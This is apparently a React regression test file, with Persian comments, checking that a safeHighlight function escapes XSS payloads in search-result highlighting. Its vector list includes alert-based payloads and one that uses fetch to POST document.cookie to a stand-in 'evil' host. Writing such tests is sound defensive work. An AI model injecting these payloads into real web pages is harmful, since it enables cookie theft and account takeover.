import { render } from '@testing-library/react';
import { safeHighlight } from './safeHighlight';

// corpusِ مشترکِ بردارهای XSS (regression). هر مورد باید به‌صورتِ متنِ literal رندر شود،
// نه به‌عنوانِ element اجراشونده — یعنی هیچ <img>/<script>/<svg>/event-handler در DOM ساخته نشود.
const XSS_VECTORS = [
  '<img src=x onerror=alert(1)>',
  '<img src onerror="fetch(\'https://evil/\',{method:\'POST\',body:document.cookie})">',
  '<script>alert(1)</script>',
  '<svg onload=alert(1)>',
  '"><img src=x onerror=alert(1)>',
  '<a href="javascript:alert(1)">x</a>',
];

const containerHtml = (node: React.ReactNode) => {
  const { container } = render(<div>{node}</div>);
  return container;
};

describe('safeHighlight — regression گاردِ XSS', () => {
  it('برای هر بردارِ XSS هیچ element اجراشونده نمی‌سازد', () => {
    XSS_VECTORS.forEach(vector => {
      // شبیه‌سازیِ خروجیِ سرور: کوئریِ کاربر در «جست و جوی <em>...</em> در ایران» بازتاب شده
      const formatted = `جست و جوی <em>${vector}</em> در ایران`;
      const container = containerHtml(safeHighlight(formatted));

      // هیچ node خطرناکی نباید در DOM باشد
      expect(container.querySelector('img')).toBeNull();
      expect(container.querySelector('script')).toBeNull();
      expect(container.querySelector('svg')).toBeNull();
      expect(container.querySelector('a')).toBeNull();
      // payload باید به‌صورتِ متن دیده شود
      expect(container.textContent).toContain(vector);
    });
  });

  it('هیچ تگِ خامِ اجراشونده در innerHTML ساخته نمی‌شود (payload به‌صورتِ entity escape می‌شود)', () => {
    const container = containerHtml(safeHighlight('a <em><img src=x onerror=alert(1)></em> b'));
    // نباید تگِ خامِ <img ساخته شود؛ باید به‌صورتِ &lt;img escape شده باشد
    expect(container.innerHTML).not.toContain('<img');
    expect(container.innerHTML).toContain('&lt;img');
    expect(container.querySelector('img')).toBeNull();
  });

  it('highlightِ سالمِ <em> را به عنصرِ em تبدیل می‌کند (نه innerHTML)', () => {
    const container = containerHtml(safeHighlight('جست و جوی <em>قلب</em> در ایران'));
    const em = container.querySelector('em');
    expect(em).not.toBeNull();
    expect(em?.textContent).toBe('قلب');
    expect(container.textContent).toBe('جست و جوی قلب در ایران');
  });

  it('highlightِ platform (<span style pink>) را به رنگِ ثابت تبدیل می‌کند', () => {
    const container = containerHtml(safeHighlight('a <span style="color: #ec1448">b</span> c'));
    const span = container.querySelector('span[style]');
    expect(span).not.toBeNull();
    expect(span?.textContent).toBe('b');
  });

  it('ورودیِ escape-شدهٔ سرور (&lt;img&gt;) را برای نمایش decode می‌کند ولی امن می‌ماند', () => {
    const container = containerHtml(safeHighlight('x <em>&lt;img src=x onerror=alert(1)&gt;</em> y'));
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('<img src=x onerror=alert(1)>');
  });

  it('empty/null را بی‌خطر هندل می‌کند', () => {
    expect(safeHighlight('')).toBeNull();
    expect(safeHighlight(undefined)).toBeNull();
    expect(safeHighlight(null)).toBeNull();
  });

  it('متنِ ساده (بدونِ highlight) را دست‌نخورده نشان می‌دهد', () => {
    const container = containerHtml(safeHighlight('متخصص زنان و زایمان'));
    expect(container.textContent).toBe('متخصص زنان و زایمان');
    expect(container.querySelector('em')).toBeNull();
  });
});
